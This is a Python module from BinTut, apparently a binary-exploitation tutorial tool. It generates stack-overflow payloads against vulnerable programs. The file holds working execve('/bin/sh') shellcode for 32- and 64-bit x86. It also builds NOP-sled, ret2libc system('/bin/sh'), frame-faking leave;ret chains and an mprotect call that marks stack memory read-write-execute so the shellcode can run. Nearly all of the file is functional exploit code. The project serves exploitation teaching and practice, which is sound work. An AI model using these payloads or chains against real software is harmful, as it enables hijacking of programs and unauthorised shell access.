"""
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This file is part of BinTut.

BinTut is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BinTut is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with BinTut.  If not, see <http://www.gnu.org/licenses/>.
"""


from .helpers import Addr, get_size_of_pointer
from .utils import p32, red


# /usr/include/asm-generic/mman-common.h
# #define PROT_READ	0x1		/* page can be read */
# #define PROT_WRITE	0x2		/* page can be written */
# #define PROT_EXEC	0x4		/* page can be executed */

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC


def align_to_page(addr):
    return hex(int(addr, 16) & ~4095)


def mprotect(offset, addr):
    # TODO: Support adding shellcode.
    shellcode = Shellcode()
    size_of_pointer = get_size_of_pointer()
    sc_addr = hex(int(addr, 16) + 2*size_of_pointer)
    frames = (
        Faked(offset=offset, address=addr) + shellcode +
        Faked('mprotect', [align_to_page(sc_addr), 4096, PROT_RWX]) +
        Faked(next_address=sc_addr))
    print(red(sc_addr))
    return frames.payload


# TODO: Make it a class.
class Shellcode(object):
    def __init__(self):
        sc32 = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
                    b"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
                    b"\x80"
        sc64 = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f" \
                    b"\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31" \
                    b"\xd2\x0f\x05"
        size_of_pointer = get_size_of_pointer()
        self.sc = sc32 if size_of_pointer == 4 else sc64


def frame_faking(offset, addr):
    frames = (
        Faked(offset=offset, address=addr) +
        Faked('system', ['/bin/sh']) +
        Faked('system', ['/bin/sh']) +
        Faked('exit', [0]))
    return frames.payload


def ret_to_func():
    size_of_pointer = get_size_of_pointer()
    system = Addr('system')
    binsh = Addr('/bin/sh')
    exit_addr = p32(Addr('exit'))
    exit_code = b'\x00' * size_of_pointer
    return p32(system) + exit_addr + p32(binsh) + exit_code


def nop_slide(addr):
    size_of_pointer = get_size_of_pointer()
    print(red('Ret Target (a.k.a Shellcode Entry): {}'.format(addr)))
    nop = b'\x90' * 50
    print('Returning to addr:', addr)
    return p32(addr) + nop + Shellcode().sc


def plain(addr):
    size_of_pointer = get_size_of_pointer()
    print(red('Ret Target (a.k.a Shellcode Entry): {}'.format(addr)))
    return p32(addr) + Shellcode().sc


class Faked(object):
    """A faked frame.

    Three valid use cases are as follows:
    Faked(name, args) is a normal frame,
    Faked(offset=offset, address=address) the starting frame, and
    Faked(address=address, payload=payload) the resulting frame.
    """
    filling_byte = b'\xff'

    def __init__(self, name=None, args=None, offset=None,
                 address=None, payload=None, next_address=None):
        self.offset = offset
        self.address = address
        self.name = name

        if args is None:
            self.args = []
        else:
            self.args = args

        self.size_of_pointer = get_size_of_pointer()

        if self.offset:
            # Construct the starting faked frame.
            self.payload = (
                self.filling_byte*(offset-self.size_of_pointer) +
                p32(self.address) +
                p32(Addr('leave_ret')))
        else:
            self.payload = payload

        self.next_address = next_address

    def __add__(self, other):
        """Combine two faked frames.

        Expected left operands should be either
        the starting faked frame or resulting frames constructed by
        a previous combination, while right operands a normal frame.
        """
        if isinstance(other, Shellcode):
            # TODO: Support adding shellcode.
            address = hex(int(self.address, 16) + len(other.sc))
            payload = (
                self.filling_byte*(
                    self.offset-self.size_of_pointer) +
                p32(address) + p32(Addr('leave_ret')) + other.sc)
        elif other.next_address:
            address = other.next_address
            payload = (
                self.payload + p32(address) + p32(address) +
                p32(Addr('leave_ret')))
        else:
            address = hex((int(self.address, 16) +
                           3*self.size_of_pointer +
                           len(other.args)*self.size_of_pointer))
            payload = (self.payload +
                       p32(address) + p32(Addr(other.name)) +
                       p32(Addr('leave_ret')) + other.make_args())
        # Construct a resulting frame.
        return self.__class__(address=address, payload=payload)

    def make_args(self):
        """Prepare stack arguments for the function in the frame.

        For the time being, it handles strings and integrals.
        """
        args = b''
        for arg in self.args:
            if isinstance(arg, int):
                args += p32('{:#010x}'.format(arg))
            elif isinstance(arg, str):
                args += p32(Addr(arg))
            else:
                raise ValueError
        return args
